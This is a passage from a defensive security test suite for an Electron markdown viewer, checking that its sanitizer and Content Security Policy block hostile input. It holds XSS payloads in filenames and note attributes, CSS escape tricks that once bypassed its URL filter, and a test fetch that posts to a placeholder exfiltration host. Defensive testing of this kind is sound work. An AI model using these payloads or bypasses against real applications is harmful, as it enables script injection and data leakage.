    attrsSurvived.found === true &&
      attrsSurvived.id === NOTE_PAYLOAD_ID &&
      attrsSurvived.color === NOTE_PAYLOAD_COLOR,
    JSON.stringify(attrsSurvived),
  );

  const panel = await exec(`
    (() => {
      window.__pwned = null;
      window.__e2eErrors.length = 0;
      updateNotesList();
      const list = document.getElementById('notesList');
      const idSpan = list.querySelector('.notes-item-id');
      const item = list.querySelector('.notes-item');
      let clickThrew = null;
      try { item && item.click(); } catch (e) { clickThrew = String(e && e.message || e); }
      return {
        injected: list.querySelectorAll('img, script, iframe').length,
        idText: idSpan ? idSpan.textContent : null,
        borderLeftColor: item ? getComputedStyle(item).borderLeftColor : null,
        clickThrew,
        pwned: window.__pwned,
      };
    })()
  `);
  await sleep(200);
  check(
    "SEC-13 a data-note-id payload renders as text in the All-Notes panel",
    panel.injected === 0 &&
      panel.idText === "#" + NOTE_PAYLOAD_ID &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(panel),
  );
  check(
    "SEC-13 a data-note-color payload is normalized away rather than applied",
    panel.borderLeftColor === "rgb(255, 102, 0)",
    JSON.stringify(panel),
  );
  // The listener runs asynchronously, so a broken selector surfaces as an
  // uncaught error rather than a throw at the .click() call site - checking
  // only clickThrew would miss it entirely.
  const panelClickErrors = await exec(`window.__e2eErrors.slice()`);
  check(
    "SEC-13 clicking the panel item does not break the attribute selector",
    panel.clickThrew === null && panelClickErrors.length === 0,
    JSON.stringify({ clickThrew: panel.clickThrew, errors: panelClickErrors }),
  );

  const tip = await exec(`
    (() => {
      window.__pwned = null;
      const el = document.querySelector('#viewer .noted-text');
      showNoteTooltip(el, true);
      const t = document.getElementById('noteTooltip');
      return {
        injected: t.querySelectorAll('img, script, iframe').length,
        text: t.textContent,
        closeButtons: t.querySelectorAll('.note-tooltip-close').length,
      };
    })()
  `);
  await sleep(200);
  check(
    "SEC-13 a data-note-id payload renders as text in the note tooltip",
    tip.injected === 0 &&
      tip.text.includes(NOTE_PAYLOAD_ID) &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(tip),
  );
  check(
    "FEATURE the pinned tooltip still has a working close button",
    tip.closeButtons === 1,
    JSON.stringify(tip),
  );
  await exec(`closeNoteTooltip(); null`);

  // SEC-14: `<`, `>`, `"` and `&` are all legal in filenames on the Linux and
  // macOS release targets, and recent files are persisted, so a hostile name
  // re-arms the payload on every launch.
  const RECENT_PAYLOAD = `/tmp/<img src=x onerror="window.__pwned='recent'">.md`;
  const recent = await exec(`
    (() => {
      window.__pwned = null;
      const saved = localStorage.getItem('recentFiles');
      try {
        saveRecentFile(${JSON.stringify(RECENT_PAYLOAD)});
        updateFileMenuRecent();
        const host = document.getElementById('fileMenuRecent');
        const name = host.querySelector('.tools-menu-recent-name');
        return {
          injected: host.querySelectorAll('img, script, iframe').length,
          nameText: name ? name.textContent : null,
          pathText: host.querySelector('.tools-menu-recent-path').textContent,
        };
      } finally {
        if (saved === null) localStorage.removeItem('recentFiles');
        else localStorage.setItem('recentFiles', saved);
        updateFileMenuRecent();
      }
    })()
  `);
  await sleep(200);
  check(
    "SEC-14 a hostile filename renders as text in the recent-files menu",
    recent.injected === 0 &&
      recent.nameText === `<img src=x onerror="window.__pwned='recent'">.md` &&
      recent.pathText === RECENT_PAYLOAD &&
      (await exec(`window.__pwned`)) === null,
    JSON.stringify(recent),
  );

  // <iframe> is in ADD_TAGS (for @@@html) and `src` is allowed by DOMPurify by
  // default, so `<iframe src="https://…">` in plain markdown would otherwise
  // fetch and run a remote page with no click at all. The app's own iframes are
  // srcdoc-only, so `src` is stripped in the sanitizer hook.
  await render(
    '# Nav\n\n<iframe src="https://probe.invalid/frame"></iframe>\n',
    "full",
    1200,
  );
  const frameState = await exec(`
    (() => {
      const f = document.querySelector('#viewer iframe');
      return {
        // Control: the iframe element itself must still be there, otherwise
        // this passes because the render failed rather than because src went.
        present: !!f,
        src: f ? f.getAttribute('src') : 'NO-IFRAME',
        sandbox: f ? f.getAttribute('sandbox') : null
      };
    })()
  `);
  check(
    "SEC-11 a remote <iframe src> is stripped, the sandboxed element survives",
    frameState.present === true &&
      frameState.src === null &&
      frameState.sandbox === "allow-scripts",
    JSON.stringify(frameState),
  );

  // SEC-21 - inline `style` cannot be removed from the allowlist (notes, themes
  // and upstream markdown all use it), so CSS is a fetch surface the link policy
  // never sees. `img-src https:` is deliberately open, so the CSP does not stop
  // a background-image beacon either. These drive the real sanitizer.
  await render(
    "# CSS\n\n" +
      '<div id="css-remote" style="color:rgb(1,2,3);background-image:url(https://probe.invalid/beacon?doc=secret)">a</div>\n\n' +
      '<div id="css-escaped" style="background-image:url(\\68 ttps://probe.invalid/esc)">b</div>\n\n' +
      '<div id="css-share" style="background-image:url(//probe.invalid/share/x.png)">c</div>\n\n' +
      '<div id="css-imageset" style="background-image:-webkit-image-set(&quot;https://probe.invalid/set.png&quot; 1x)">d</div>\n\n' +
      '<div id="css-data" style="background-image:url(data:image/png;base64,iVBORw0KGgo=)">e</div>\n\n' +
      '<div id="css-relative" style="background-image:url(pics/local.png)">f</div>\n\n' +
      "<style>@import url(https://probe.invalid/sheet.css); .x { background: url(https://probe.invalid/in-style.png); }</style>\n",
    "full",
    1200,
  );
  const cssState = await exec(`
    (() => {
      const at = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('style') || '') : 'NO-ELEMENT';
      };
      const styleEl = document.querySelector('#viewer style');
      return {
        remote: at('css-remote'),
        escaped: at('css-escaped'),
        share: at('css-share'),
        imageset: at('css-imageset'),
        data: at('css-data'),
        relative: at('css-relative'),
        styleText: styleEl ? styleEl.textContent : 'NO-STYLE-ELEMENT'
      };
    })()
  `);
  const noProbe = (s) => typeof s === "string" && !s.includes("probe.invalid");
  check(
    "SEC-21 a remote CSS url() in a style attribute is neutralised",
    noProbe(cssState.remote) && cssState.remote.includes('url("about:blank")'),
    JSON.stringify(cssState.remote),
  );
  // Control: neutralising the URL must not destroy the rest of the declaration,
  // otherwise the fix is indistinguishable from dropping `style` altogether -
  // which is the outcome this whole entry exists to avoid.
  check(
    "SEC-21 the surviving declarations in that style attribute are untouched",
    typeof cssState.remote === "string" &&
      /rgb\(1,\s*2,\s*3\)/.test(cssState.remote),
    JSON.stringify(cssState.remote),
  );
  check(
    "SEC-21 a CSS-escaped scheme (\\68 ttps:) does not bypass the filter",
    noProbe(cssState.escaped) && cssState.escaped.includes('url("about:blank")'),
    JSON.stringify(cssState.escaped),
  );
  check(
    "SEC-21 a protocol-relative CSS url() is neutralised (SMB/NTLM leak)",
    noProbe(cssState.share) && cssState.share.includes('url("about:blank")'),
    JSON.stringify(cssState.share),
  );
  check(
    "SEC-21 image-set(), which needs no url() wrapper, is neutralised too",
    noProbe(cssState.imageset),
    JSON.stringify(cssState.imageset),
  );
  check(
    "SEC-21 an inert data:image URL is kept, so legitimate CSS still works",
    typeof cssState.data === "string" &&
      cssState.data.includes("data:image/png;base64"),
    JSON.stringify(cssState.data),
  );
  check(
    "SEC-21 a relative CSS url() is kept",
    typeof cssState.relative === "string" &&
      cssState.relative.includes("pics/local.png") &&
      !cssState.relative.includes("about:blank"),
    JSON.stringify(cssState.relative),
  );
  check(
    "SEC-21 a <style> element's text is filtered, and @import removed entirely",
    typeof cssState.styleText === "string" &&
      cssState.styleText !== "NO-STYLE-ELEMENT" &&
      !cssState.styleText.includes("probe.invalid") &&
      !/@import/i.test(cssState.styleText),
    JSON.stringify(cssState.styleText),
  );

  // The three bypass classes below were all found by independent review AFTER
  // the first version of this filter passed its own tests, and all three were
  // confirmed live against Chromium (the engine really does resolve them to a
  // fetch) before being fixed. They are the reason the filter now normalises
  // through Chromium's own parser instead of trusting hand-written regexes:
  //
  //   1. `url("ht\<LF>tps://…")` - a backslash-newline line continuation inside
  //      a string is consumed by CSS and produces nothing, so the engine sees a
  //      scheme where the regex saw none.
  //   2. `\75rl(…)`, `\69mage-set(…)`, `@im\70ort` - the *identifier* can be
  //      escaped too, not just the value inside it.
  //   3. an SVG-namespaced <style>, whose localName is lower case.
  await render(
    "# Escapes\n\n" +
      '<div id="esc-nl" style="background-image:url(&quot;ht\\\ntps://probe.invalid/nl&quot;)">a</div>\n\n' +
      '<div id="esc-fn" style="background-image:\\75rl(//probe.invalid/share/fn.png)">b</div>\n\n' +
      "<div id=\"esc-set\" style=\"background-image:\\69mage-set('https://probe.invalid/set2.png' 1x)\">c</div>\n\n" +
      '<div id="esc-var" style="--evil:url(&quot;ht\\\ntps://probe.invalid/varleak&quot;);background-image:var(--evil)">d</div>\n\n' +
      '<style>@im\\70ort "https://probe.invalid/escaped-import.css"; .z { background: url(https://probe.invalid/z.png); }</style>\n\n' +
      '<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10">' +
      "<style>.s{background:url(&quot;https://probe.invalid/svgstyle&quot;)}</style>" +
      '<rect id="esc-svgrect" width="10" height="10" style="fill:red;background-image:url(https://probe.invalid/svgattr)"/>' +
      "</svg>\n",
    "full",
    1200,
  );
  const escState = await exec(`
    (() => {
      const at = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('style') || '') : 'NO-ELEMENT';
      };
      const styles = [...document.querySelectorAll('#viewer style')].map(s => s.textContent);
      return {
        nl: at('esc-nl'),
        fn: at('esc-fn'),
        set: at('esc-set'),
        varLeak: at('esc-var'),
        svgRect: at('esc-svgrect'),
        styleTexts: styles,
        // Control: the SVG must actually have survived sanitization, otherwise
        // the SVG assertions below pass because nothing rendered.
        svgPresent: !!document.querySelector('#viewer svg')
      };
    })()
  `);
  check(
    "SEC-21 a backslash-newline line continuation does not hide a scheme",
    noProbe(escState.nl),
    JSON.stringify(escState.nl),
  );
  check(
    "SEC-21 an escaped url() identifier (\\75rl) is still filtered",
    noProbe(escState.fn),
    JSON.stringify(escState.fn),
  );
  check(
    "SEC-21 an escaped image-set() identifier (\\69mage-set) is still filtered",
    noProbe(escState.set),
    JSON.stringify(escState.set),
  );
  // Custom properties are stored as raw token streams and are NOT canonicalised
  // by the engine, so var() is an independent route to a live URL.
  check(
    "SEC-21 a remote URL smuggled through a CSS custom property is filtered",
    noProbe(escState.varLeak),
    JSON.stringify(escState.varLeak),
  );
  check(
    "SEC-21 an escaped at-keyword (@im\\70ort) does not survive",
    Array.isArray(escState.styleTexts) &&
      escState.styleTexts.every((t) => !/probe\.invalid/.test(t)) &&
      escState.styleTexts.every((t) => !/@im/i.test(t)),
    JSON.stringify(escState.styleTexts),
  );
  check(
    "SEC-21 an SVG-namespaced <style> is filtered too (localName is lower case)",
    escState.svgPresent === true &&
      Array.isArray(escState.styleTexts) &&
      escState.styleTexts.every((t) => !/svgstyle/.test(t)),
    JSON.stringify({ present: escState.svgPresent, styles: escState.styleTexts }),
  );
  check(
    "SEC-21 a style attribute on an SVG element is filtered",
    noProbe(escState.svgRect),
    JSON.stringify(escState.svgRect),
  );

  // The SEC-21 hook rewrites the `style` attribute on EVERY sanitized document,
  // so it can plausibly break ordinary formatting rather than only the hostile
  // case. The assertions above cannot see that - they read attribute text, not
  // pixels. This renders a document of ordinary inline-styled markdown and
  // leaves a screenshot for a human to look at, which is how the mermaid theme
  // bug was caught after seventeen geometry assertions missed it.
  await render(
    "# Styled document\n\n" +
      '<p style="color:#e06c75;font-size:20px">Coloured, larger text.</p>\n\n' +
      '<p style="background:#2c313a;padding:12px;border-left:4px solid #61afef">' +
      "A callout with a background, padding and a border.</p>\n\n" +
      '<span style="font-weight:bold">Bold via inline style</span> and ' +
      '<span style="text-decoration:underline">underline</span>.\n\n' +
      "| Col | Value |\n|---|---|\n| a | 1 |\n| b | 2 |\n",
    "full",
    900,
  );
  const styledLook = await exec(`
    (() => {
      const ps = [...document.querySelectorAll('#viewer p')];
      const cs = (el) => el ? getComputedStyle(el) : null;
      const a = cs(ps[0]);
      const b = cs(ps[1]);
      return {
        colour: a && a.color,
        size: a && a.fontSize,
        background: b && b.backgroundColor,
        padding: b && b.paddingLeft,
        border: b && b.borderLeftWidth
      };
    })()
  `);
  // Tier-1 gate for the same thing the screenshot shows, so this never depends
  // on someone remembering to look.
  check(
    "SEC-21 ordinary inline styling still reaches the rendered page",
    styledLook.colour === "rgb(224, 108, 117)" &&
      styledLook.size === "20px" &&
      styledLook.background === "rgb(44, 49, 58)" &&
      styledLook.padding === "12px" &&
      styledLook.border === "4px",
    JSON.stringify(styledLook),
  );
  await captureScreenshot(win, "security-inline-styles");

  // An @@@html frame relocating itself is the one path that exercises the
  // will-frame-navigate branch. Without a test here, inverting the isMainFrame
  // early-return - or deleting the listener - passes the whole suite.
  //
  // Two things this must get right, both learned the hard way:
  //  * webContents.getURL() reports only the TOP frame, so asserting on it is
  //    vacuous - a sandboxed frame navigating *itself* leaves it untouched.
  //    The frame tree has to be inspected directly.
  //  * the target must be REMOTE. A file: target proves nothing, because
  //    Chromium refuses to let a sandboxed, origin-opaque frame reach a local
  //    resource on its own - the test then passes with the guard deleted.
  //    Measured with the guard removed: subframeUrls became
  //    ["https://probe.invalid/frame-probe"], i.e. the frame really does
  //    relocate, and DNS failure does not prevent the URL from committing.
  const frameProbeUrl = "https://probe.invalid/frame-probe";
  await exec(`
    window.__navProbeSeen = false;
    window.addEventListener('message', (e) => {
      if (e.data && e.data.__navProbe) window.__navProbeSeen = true;
    });
    null;
  `);
  const urlBeforeFrame = win.webContents.getURL();
  await render(
    "# Nav\n\n@@@html\n" +
      "<script>parent.postMessage({__navProbe:1},'*');" +
      `location.href=${JSON.stringify(frameProbeUrl)};</script>\n` +
      "@@@\n",
    "full",
    2500,
  );
  const subframeUrls = win.webContents.mainFrame.frames.map((f) => f.url);
  const frameNav = await exec(`
    ({ present: !!document.querySelector('#viewer iframe'),
       ran: window.__navProbeSeen === true })
  `);
  check(
    "SEC-11 an @@@html frame cannot reach a remote origin",
    frameNav.present === true && win.webContents.getURL() === urlBeforeFrame,
    JSON.stringify({ frameNav, subframeUrls, urlBeforeFrame }),
  );
  // Separated from the assertion above on review: it is not a SEC-11 control at
  // all, it is the control for SEC-09's 'unsafe-inline'. An about:srcdoc frame
  // inherits the embedder's policy, so if 'unsafe-inline' were dropped from
  // script-src this inline script would not run and `ran` goes false.
  check(
    "SEC-09 an inline script inside an @@@html srcdoc frame still runs",
    frameNav.ran === true,
    JSON.stringify(frameNav),
  );

  // The end-to-end probe above can no longer tell the two layers apart. Since
  // SEC-09 landed, `default-src 'none'` leaves no frame-src, so Chromium
  // refuses the navigation with ERR_BLOCKED_BY_CSP before will-frame-navigate
  // is consulted - and a CSP-blocked navigation still *commits* an error
  // document, so the frame's own URL becomes the target either way. That kills
  // the discriminator the old assertion relied on: it now passes with the
  // guard deleted, and it cannot be repaired by choosing a different target
  // because the policy permits no frame destination at all.
  //
  // So the guard is exercised directly instead. Emitting the event reproduces
  // exactly what Electron passes the handler, and covers the branch an
  // end-to-end test never could: that isMainFrame is an early *return* and not
  // an early preventDefault, which would make will-navigate unreachable.
  const emitFrameNav = (isMainFrame) => {
    let prevented = false;
    win.webContents.emit("will-frame-navigate", {
      isMainFrame,
      url: "https://probe.invalid/emitted",
      preventDefault() {
        prevented = true;
      },
    });
    return prevented;
  };
  check(
    "SEC-11 will-frame-navigate is armed and denies subframe navigation",
    win.webContents.listenerCount("will-frame-navigate") > 0 &&
      emitFrameNav(false) === true,
  );
  check(
    "SEC-11 will-frame-navigate defers main-frame navigation to will-navigate",
    emitFrameNav(true) === false &&
      win.webContents.listenerCount("will-navigate") > 0,
  );

  // Read this before the navigation probes below: if a navigation guard fails,
  // the document that holds __e2eErrors is replaced and the check would report
  // the wrong thing.
  const errs = await exec(`window.__e2eErrors`);

  // ==========================================================================
  // SEC-11 - navigating the Node-privileged main window
  //
  // Two independent controls, tested separately:
  //   (a) DOMPurify must not emit <form action> / formaction, so the markup
  //       that expresses a one-click navigation never exists;
  //   (b) main.js must deny will-navigate / will-redirect / window.open, so a
  //       navigation the sanitizer cannot see (location assignment, meta
  //       refresh, an @@@html frame) still goes nowhere.
  // ==========================================================================
  await render(
    "# Nav\n\n" +
      '<form action="https://probe.invalid/pwn" method="get">' +
      "<button>SubmitProbe</button></form>\n\n" +
      '<button formaction="https://probe.invalid/fa">FormActionProbe</button>\n',
    "full",
    1200,
  );
  const formState = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const btns = Array.from(v.querySelectorAll('button'));
      return {
        forms: v.querySelectorAll('form').length,
        actionAttrs: v.querySelectorAll('[action]').length,
        // Note: DOMPurify strips formaction unaided, so this clause locks in
        // current sanitizer behaviour rather than testing FORBID_ATTR. The
        // load-bearing clause is the form count; that one fails without
        // FORBID_TAGS (measured).
        formActionAttrs: v.querySelectorAll('[formaction]').length,
        // Control: DOMPurify unwraps a forbidden tag and keeps its children, so
        // the button surviving proves the payload reached the sanitizer and was
        // specifically stripped - not that the whole render silently failed.
        submitBtn: btns.some(b => b.textContent === 'SubmitProbe'),
        faBtn: btns.some(b => b.textContent === 'FormActionProbe')
      };
    })()
  `);
  check(
    "SEC-11 <form action> and formaction are stripped, their content is not",
    formState.forms === 0 &&
      formState.actionAttrs === 0 &&
      formState.formActionAttrs === 0 &&
      formState.submitBtn === true &&
      formState.faBtn === true,
    JSON.stringify(formState),
  );

  // <map><area href> survives DOMPurify: an image map is a hyperlink that is
  // not an <a>. The renderer's click handler now matches it, so it obeys the
  // same external/local policy as every other link instead of falling through
  // to Chromium's default follow.
  await render(
    '# Nav\n\n<img src="x.png" usemap="#m" alt="m">\n' +
      '<map name="m"><area shape="rect" coords="0,0,20,20" ' +
      'href="https://probe.invalid/area" alt="AreaProbe"></map>\n',
    "full",
    1000,
  );
  const areaState = await exec(`
    (() => {
      const a = document.querySelector('#viewer area');
      return a ? { present: true, href: a.getAttribute('href') } : { present: false };
    })()
  `);
  // Stub the external opener *inside the renderer* - test-render-security.js
  // runs in the main process, and patching its own require('electron') would
  // leave the renderer's copy untouched and the assertion vacuous.
  await exec(`
    window.__externalUrl = null;
    window.__savedOpenExternal = require('electron').shell.openExternal;
    require('electron').shell.openExternal = (u) => {
      window.__externalUrl = u;
      return Promise.resolve();
    };
    null;
  `);
  const urlBeforeArea = win.webContents.getURL();
  await exec(`document.querySelector('#viewer area').click(); null`);
  await sleep(700);
  const urlAfterArea = win.webContents.getURL();
  const externalUrl = await exec(`window.__externalUrl`);
  await exec(`
    require('electron').shell.openExternal = window.__savedOpenExternal;
    delete window.__savedOpenExternal;
    null;
  `);
  check(
    "SEC-11 an <area href> is routed through the link policy, not Chromium",
    areaState.present === true &&
      areaState.href === "https://probe.invalid/area" &&
      externalUrl === "https://probe.invalid/area" &&
      urlAfterArea === urlBeforeArea,
    JSON.stringify({ areaState, externalUrl, urlBeforeArea, urlAfterArea }),
  );

  // ==========================================================================
  // SEC-09 - Content Security Policy on the main window
  //
  // These probes deliberately build elements with document.createElement and
  // call eval/fetch directly instead of going through markdown. The sanitizer
  // already stops most of this markup, so routing through render() would test
  // DOMPurify a second time and pass with the CSP deleted. The layer under
  // test here is the policy itself, so the sanitizer is bypassed on purpose.
  //
  // A violation is reported to `securitypolicyviolation` on the document that
  // owns the blocked load. That makes it the only way to tell "the CSP refused
  // this" apart from "the network refused this" - which matters because every
  // probe host below is unresolvable.
  //
  // Note the @@@html frame check above doubles as the control for the
  // 'unsafe-inline' decision: an about:srcdoc frame inherits this policy, so
  // if 'unsafe-inline' were dropped from script-src, `frameNav.ran` there goes
  // false and that check fails.
  await exec(`
    window.__csp = [];
    document.addEventListener('securitypolicyviolation', (e) => {
      window.__csp.push({ d: e.violatedDirective, u: String(e.blockedURI || '') });
    });
    null;
  `);
  const cspHits = (frag, dir) =>
    exec(
      `window.__csp.some(v => v.d.indexOf(${JSON.stringify(dir)}) === 0 && v.u.indexOf(${JSON.stringify(frag)}) >= 0)`,
    );
  // securitypolicyviolation is delivered asynchronously, and how long that
  // takes varies with machine load - a fixed sleep is a coin flip that only
  // ever loses on a busy machine (observed: object-src arriving after 600ms
  // during a full-suite run, passing standalone). Poll for the violation
  // instead, so a slow delivery costs time rather than correctness.
  //
  // Only usable for the POSITIVE assertions. Absence cannot be polled for, so
  // the "not refused" cases keep a fixed settle.
  const waitForCsp = async (frag, dir, budgetMs) => {
    const deadline = Date.now() + (budgetMs || 8000);
    for (;;) {
      if (await cspHits(frag, dir)) return true;
      if (Date.now() > deadline) return false;
      await sleep(100);
    }
  };

  check(
    "SEC-09 a Content-Security-Policy meta is present in index.html",
    (await exec(
      `!!document.querySelector('meta[http-equiv="Content-Security-Policy"]')`,
    )) === true,
  );

  // A remote script is the vector the vendoring work in SEC-16 removed by
  // hand; this makes it structurally impossible to reintroduce at runtime.
  await exec(`
    window.__remoteScriptRan = false;
    const s = document.createElement('script');
    s.src = 'https://probe.invalid/csp-remote.js';
    document.body.appendChild(s);
    null;
  `);
  await sleep(600);
  check(
    "SEC-09 a remote <script src> is refused by script-src",
    (await waitForCsp("probe.invalid", "script-src")) === true &&
      (await exec(`window.__remoteScriptRan === false`)) === true,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // No 'unsafe-eval'. Measured, not assumed: mermaid 11 and Prism both render
  // under this policy, so nothing on the render path needs it.
  const evalState = await exec(`
    (() => {
      try { (0, eval)('1+1'); return 'ran'; }
      catch (e) { return e && e.name ? e.name : 'threw'; }
    })()
  `);
  check(
    "SEC-09 eval() is blocked (script-src carries no 'unsafe-eval')",
    evalState === "EvalError",
    String(evalState),
  );

  // connect-src is the directive that actually earns its place: it is the
  // difference between "an injected script can read your files" and "an
  // injected script can read your files and post them somewhere".
  await exec(`
    fetch('https://probe.invalid/csp-exfil', { method: 'POST', body: 'x' })
      .then(() => {}, () => {});
    null;
  `);
  await sleep(600);
  check(
    "SEC-09 an outbound fetch to an unlisted host is refused by connect-src",
    (await waitForCsp("probe.invalid", "connect-src")) === true,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // The translation endpoint used to be the one remote host connect-src had to
  // name. It is now fetched in the main process (SEC-09), so the renderer must
  // NOT be able to reach it either - the exception is gone, not merely unused.
  await exec(`
    fetch('https://translate.googleapis.com/translate_a/single?client=gtx')
      .then(() => {}, () => {});
    null;
  `);
  check(
    "SEC-09 even the translation endpoint is refused (connect-src 'none')",
    (await waitForCsp("translate.googleapis.com", "connect-src")) === true,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // ...and the feature it used to serve still has a route, in the main process.
  // Without this the assertion above could be satisfied by simply deleting
  // translation, which is not the same fix at all. The language validation is
  // exercised rather than the network, which is not available here: a bad tag
  // must be refused before any request is built, and a good one must get past
  // validation and fail on the network instead.
  const badLang = await exec(`
    require('electron').ipcRenderer.invoke('translate-text',
      { text: 'hello', targetLang: '../../evil' })
      .then(() => 'resolved', (e) => String(e && e.message))
  `);
  const goodLang = await exec(`
    require('electron').ipcRenderer.invoke('translate-text',
      { text: 'hello', targetLang: 'fr' })
      .then(() => 'resolved', (e) => String(e && e.message))
  `);
  check(
    "SEC-09 translation moved to the main process, and validates its language tag",
    /Unsupported target language/.test(badLang) &&
      !/Unsupported target language/.test(goodLang) &&
      !/No handler registered/.test(goodLang),
    JSON.stringify({ badLang, goodLang }),
  );

  // <base> rewrites the resolution of every relative URL already in the
  // document, retroactively. base-uri 'none' is the only thing that stops it.
  const baseState = await exec(`
    (() => {
      const before = document.baseURI;
      const b = document.createElement('base');
      b.href = 'https://probe.invalid/base/';
      document.head.appendChild(b);
      const after = document.baseURI;
      b.remove();
      return { changed: before !== after };
    })()
  `);
  await sleep(400);
  check(
    "SEC-09 <base href> cannot retarget relative URLs (base-uri 'none')",
    baseState.changed === false &&
      (await waitForCsp("probe.invalid", "base-uri")) === true,
    JSON.stringify({ baseState, csp: await exec(`window.__csp`) }),
  );

  const objState = await exec(`
    (() => {
      const o = document.createElement('object');
      o.id = '__cspObjectProbe';
      o.data = 'https://probe.invalid/csp.swf';
      document.body.appendChild(o);
      // Reading layout here is load-bearing, not diagnostic. Chromium only
      // fetches <object data> once the element has been laid out, and it
      // throttles rendering for an occluded/background window - which is
      // exactly what this window is during an unattended full-suite run. Left
      // to itself the object is never laid out, never fetched, and never
      // refused, so the assertion below failed intermittently (and only when
      // run after another suite) against a policy that was working perfectly.
      // getBoundingClientRect() forces the layout synchronously.
      const r = o.getBoundingClientRect();
      const cs = getComputedStyle(o);
      return {
        connected: o.isConnected,
        w: r.width, h: r.height,
        display: cs.display,
        parent: o.parentElement && o.parentElement.tagName,
        bodyChildren: document.body.children.length,
      };
    })()
  `);
  await sleep(600);
  check(
    "SEC-09 plugin content is refused by object-src 'none'",
    (await waitForCsp("probe.invalid", "object-src")) === true,
    // The element's own state is reported alongside the violation list: an
    // <object> that never got a layout box is never fetched, so it would never
    // provoke a violation either - a very different failure from "object-src
    // stopped blocking", and indistinguishable from the violation list alone.
    JSON.stringify({ objState, csp: await exec(`window.__csp`) }),
  );

  // img-src deliberately keeps https:. Remote images in markdown are a real
  // feature and blocking them would be a silent rendering regression; the
  // read-receipt exposure that leaves is recorded in the audit rather than
  // traded away here. Cleartext http: is not kept, and this pins both halves
  // of that decision so neither can drift unnoticed.
  await exec(`
    const a = document.createElement('img');
    a.src = 'http://probe.invalid/cleartext.png';
    document.body.appendChild(a);
    const b = document.createElement('img');
    b.src = 'https://probe.invalid/secure.png';
    document.body.appendChild(b);
    null;
  `);
  await sleep(700);
  check(
    "SEC-09 img-src refuses cleartext http: but still allows https:",
    (await waitForCsp("cleartext.png", "img-src")) === true &&
      (await cspHits("secure.png", "img-src")) === false,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // Control: the app loads mermaid at runtime by appending a <script src> to a
  // local path. If 'self' did not match on a file:// origin, every diagram in
  // the app would silently stop rendering - and this is the assertion that
  // says so out loud.
  await render("# csp\n\n```mermaid\ngraph TD\n  A[a] --> B[b]\n```\n", "full", 3000);
  check(
    "SEC-09 script-src 'self' still permits the app's own local scripts",
    (await exec(`typeof window.mermaid`)) === "object" &&
      (await exec(
        `!!document.querySelector('#viewer .mermaid svg') || !!document.querySelector('#viewer svg[id^="mermaid"]')`,
      )) === true &&
      (await cspHits("mermaid", "script-src")) === false,
    JSON.stringify(await exec(`window.__csp`)),
  );

  // <meta http-equiv="refresh"> is the other markup-only route. DOMPurify drops
  // <meta>; assert it, so a future ADD_TAGS change cannot quietly re-enable it.
  await render(
    '# Nav\n\n<meta http-equiv="refresh" content="0;url=https://probe.invalid/mr">\n',
    "full",
    600,
  );
  check(
    "SEC-11 <meta http-equiv=refresh> does not survive sanitization",
    (await exec(`document.getElementById('viewer').querySelectorAll('meta').length`)) === 0,
  );

  // window.open must be denied by setWindowOpenHandler. Electron returns null
  // for a denied open, so this is observable from the renderer itself.
  check(
    "SEC-11 window.open from the main window is denied",
    (await exec(`window.open('https://probe.invalid/wo') === null`)) === true,
  );

  // The load-bearing one: an actual navigation attempt. A local file is used
  // rather than a remote URL so the result cannot be confused with a network
  // failure - if the guard were absent this page would commit successfully and
  // getURL() would change. Placed last because that failure destroys the
  // harness's own document.
  const navProbe = path.join(dir, "nav-probe.html");
  fs.writeFileSync(navProbe, "<html><body>navigated</body></html>", "utf8");
  const urlBefore = win.webContents.getURL();
  await exec(
    `window.location.href = ${JSON.stringify("file:///" + navProbe.replace(/\\/g, "/"))}; null`,
  );
  await sleep(900);
  const urlAfter = win.webContents.getURL();
  check(
    "SEC-11 main-window navigation away from index.html is blocked",
    urlAfter === urlBefore && /index\.html$/.test(urlAfter),
    `before=${urlBefore} after=${urlAfter}`,
  );

  // Nothing above should have produced an uncaught renderer error. `errs` was
  // snapshotted before the navigation probes because a failed guard destroys
  // the document that holds it; this second read catches anything the probes
  // themselves raised, and is monotonic so it cannot regress the first check.
  const errsAfter = await exec(`window.__e2eErrors`);
  check(
    "no uncaught renderer errors",
    Array.isArray(errs) &&
      errs.length === 0 &&
      Array.isArray(errsAfter) &&
      errsAfter.length === 0,
    JSON.stringify({ errs, errsAfter }),
  );

  // __e2eErrors only sees what window.onerror sees. The sentinel additionally
  // watches the renderer console and the rendered document, which is where a
  // CSP misconfiguration or a mermaid error graphic shows up.
  // Prove the watcher was actually watching. Without this, "no errors were
  // recorded" and "the watcher silently stopped working" are the same result -
  // the exact vacuity this harness exists to eliminate. Both detection paths
  // are checked because they fail independently.
  const alive = await proveSentinelAlive(win, sentinel);
  check(
    "the error sentinel was demonstrably watching both channels",
    alive.console === true && alive.dom === true,
    JSON.stringify(alive),
  );

  const sentinelReport = await sentinel.stop();
  check(
    "nothing rendered a visible error at any point during the suite",
    sentinelReport.hits.length === 0,
    JSON.stringify(sentinelReport.hits),
  );
}

app.whenReady().then(async () => {
  const watchdog = setTimeout(() => {
    const failed = results.filter((r) => !r.ok).length;
    console.log(
      "FAIL  harness timed out after 180s - a blocking dialog is most likely open",
    );
    console.log(
      `\n=== TIMED OUT after ${results.length - failed}/${results.length} checks ===`,
    );
    app.exit(1);
  }, 180000);
  watchdog.unref?.();

  await sleep(2500);
  const win = BrowserWindow.getAllWindows()[0];
  if (!win) {
    console.log("FAIL  no BrowserWindow was created");
    app.exit(1);
    return;
  }

  await win.webContents.executeJavaScript(`
    window.__e2eErrors = [];
    window.addEventListener('error', e => window.__e2eErrors.push(String(e.message)));
    window.addEventListener('unhandledrejection', e => window.__e2eErrors.push(String(e.reason)));
    null;
  `);

  try {
    await run(win);
  } catch (error) {
    console.log(
      "FAIL  harness threw:",
      error && error.stack ? error.stack : error,
    );
    results.push({ name: "harness", ok: false });
  }

  const failed = results.filter((r) => !r.ok).length;
  clearTimeout(watchdog);
  console.log(
    `\n=== ${results.length - failed}/${results.length} passed ===` +
      (skipped.length ? `  (${skipped.length} skipped: ${skipped.join(", ")})` : ""),
  );
  try {
